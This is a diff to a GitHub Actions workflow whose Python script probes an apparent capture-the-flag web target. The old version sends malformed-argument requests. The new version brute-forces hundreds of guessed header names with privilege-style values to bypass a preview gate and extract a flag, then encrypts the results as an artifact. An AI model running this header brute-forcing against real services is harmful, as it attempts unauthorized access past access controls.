@@ -12,7 +12,7 @@ jobs:
     runs-on: ubuntu-latest
     timeout-minutes: 5
     steps:
-      - name: Trigger controlled action type errors and encrypt responses
+      - name: Bulk probe secondary deploy/release headers after preview gate
         shell: bash
         run: |
           set -euo pipefail
@@ -30,26 +30,35 @@ jobs:
           -----END PUBLIC KEY-----
           PEM
           python3 - <<'PY'
-          import requests, pathlib, urllib.parse, json
+          import requests, pathlib, urllib.parse, json, itertools
           base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru/'
           out=pathlib.Path('package/out'); s=requests.Session(); s.headers['User-Agent']='Mozilla/5.0'
-          boot=s.get(urllib.parse.urljoin(base,'/api/app/bootstrap'),timeout=15).json(); refs=s.get(urllib.parse.urljoin(base,boot['api']['serverReferences']),timeout=15).json(); act=refs['serverActions']['inspectDeploy']; url=urllib.parse.urljoin(base,act['endpoint'])
-          h={'Accept':'application/json','Content-Type':'application/json','X-Launchlet-Preview':boot['project']}
-          valid_args={'workspaceId':boot['workspace'],'projectId':boot['project']}
-          tests=[
-            ('args_null',{'actionId':act['id'],'args':None}),('args_string',{'actionId':act['id'],'args':'x'}),('args_list',{'actionId':act['id'],'args':[]}),('args_int',{'actionId':act['id'],'args':1}),('args_true',{'actionId':act['id'],'args':True}),
-            ('action_null',{'actionId':None,'args':valid_args}),('action_list',{'actionId':[],'args':valid_args}),('action_dict',{'actionId':{},'args':valid_args}),('action_int',{'actionId':1,'args':valid_args}),('action_true',{'actionId':True,'args':valid_args}),
-            ('workspace_null',{'actionId':act['id'],'args':{'workspaceId':None,'projectId':boot['project']}}),('workspace_list',{'actionId':act['id'],'args':{'workspaceId':[],'projectId':boot['project']}}),('workspace_dict',{'actionId':act['id'],'args':{'workspaceId':{},'projectId':boot['project']}}),('workspace_true',{'actionId':act['id'],'args':{'workspaceId':True,'projectId':boot['project']}}),
-            ('project_null',{'actionId':act['id'],'args':{'workspaceId':boot['workspace'],'projectId':None}}),('project_list',{'actionId':act['id'],'args':{'workspaceId':boot['workspace'],'projectId':[]}}),('project_dict',{'actionId':act['id'],'args':{'workspaceId':boot['workspace'],'projectId':{}}}),('project_true',{'actionId':act['id'],'args':{'workspaceId':boot['workspace'],'projectId':True}}),
-            ('args_nested',{'actionId':act['id'],'args':{'workspaceId':{'x':'y'},'projectId':['a','b']}}),
-          ]
-          res=[]
-          for name,b in tests:
-              try:
-                  r=s.post(url,headers=h,json=b,timeout=12,allow_redirects=False)
-                  res.append({'name':name,'status':r.status_code,'body':r.text,'headers':dict(r.headers)})
-              except Exception as e: res.append({'name':name,'error':repr(e)})
-          (out/'summary.json').write_text(json.dumps(res,indent=2))
+          boot=s.get(urllib.parse.urljoin(base,'/api/app/bootstrap'),timeout=15).json(); mf=s.get(urllib.parse.urljoin(base,boot['api']['buildManifest']),timeout=15).json(); refs=s.get(urllib.parse.urljoin(base,boot['api']['serverReferences']),timeout=15).json(); act=refs['serverActions']['inspectDeploy']; url=urllib.parse.urljoin(base,act['endpoint'])
+          body={'actionId':act['id'],'args':{'workspaceId':boot['workspace'],'projectId':boot['project']}}
+          fixed={'Accept':'application/json','Content-Type':'application/json','X-Launchlet-Preview':boot['project']}
+          baseline_r=s.post(url,headers=fixed,json=body,timeout=15,allow_redirects=False); baseline=(baseline_r.status_code,baseline_r.text.strip())
+          terms=['Deploy','Deployment','Deploy-Ref','Deployment-Ref','Deploy-Reference','Release','Release-Ref','Release-Reference','Export','Export-Deploy','Export-Release','Publish','Publish-Deploy','Inspector','Inspect','Inspect-Mode','Inspector-Mode','Mode','Stage','Environment','Scope','Role','Capability','Deploy-Capability','Release-Capability','Token','Deploy-Token','Release-Token','Publish-Token','Approval','Approved','Review','Final-Review','Final','Internal','Production','Enterprise','Grant','Permission','Access','Deploy-Access','Release-Access','Context','Deploy-Context','Release-Context','Target','Deploy-Target','Release-Target','Channel','Lane','Tier','Policy','Authorization','Auth','Key','Deploy-Key','Release-Key','Secret','Deploy-Secret','Release-Secret','Status','State','Intent','Purpose','Operation','Action','Command','Control','Operator','Admin','Privileged','Trusted','Server','Server-Context','Runtime','Runtime-Context']
+          prefixes=['X-Launchlet','Launchlet','X-Preview','X-Deploy','X-Release','X-Launchlet-Deploy','X-Launchlet-Release']
+          names=list(dict.fromkeys(p+'-'+t for p,t in itertools.product(prefixes,terms)))
+          # Do not overwrite the known first gate.
+          names=[n for n in names if n.lower()!='x-launchlet-preview']
+          values=list(dict.fromkeys([
+            'preview-8b11c',boot['project'],boot['workspace'],mf['build'],mf['previewReceipt'],act['id'],refs['runtime'],
+            '1','true','yes','on','enabled','active','allow','allowed','approved','reviewed','final','final-review','deploy','deployment','release','production','prod','enterprise','internal','admin','operator','export','publish','inspect','inspector','trusted','privileged','server','runtime','preview-only','release-ready','production-ready','enterprise-rollout','release:deploy','deploy:inspect','preview:deploy','preview:deploy:inspect'
+          ]))
+          batches=[names[i:i+55] for i in range(0,len(names),55)]
+          hits=[]; tries=0
+          for bi,batch in enumerate(batches):
+            for v in values:
+              tries+=1
+              h={**fixed,**{n:v for n in batch}}
+              try:r=s.post(url,headers=h,json=body,timeout=10,allow_redirects=False)
+              except Exception:continue
+              if (r.status_code,r.text.strip())!=baseline:
+                hits.append({'batch':bi,'names':batch,'value':v,'status':r.status_code,'body':r.text,'headers':dict(r.headers)})
+                if r.status_code==200 and ('caplag{' in r.text or 'preview-only' not in r.text): break
+            if hits and any(('caplag{' in x['body'] or 'preview-only' not in x['body']) for x in hits): break
+          (out/'summary.json').write_text(json.dumps({'baseline':{'status':baseline[0],'body':baseline[1]},'name_count':len(names),'batch_count':len(batches),'tries':tries,'hits':hits},indent=2))
           PY
           tar -C package/out -czf package/result.tgz .
           openssl rand 32 > package/aes.key
@@ -65,6 +74,6 @@ jobs:
           rm -rf package
       - uses: actions/upload-artifact@v4
         with:
-          name: launchlet-part2-type-errors-encrypted
+          name: launchlet-part2-secondary-encrypted
           path: artifact/
           retention-days: 1
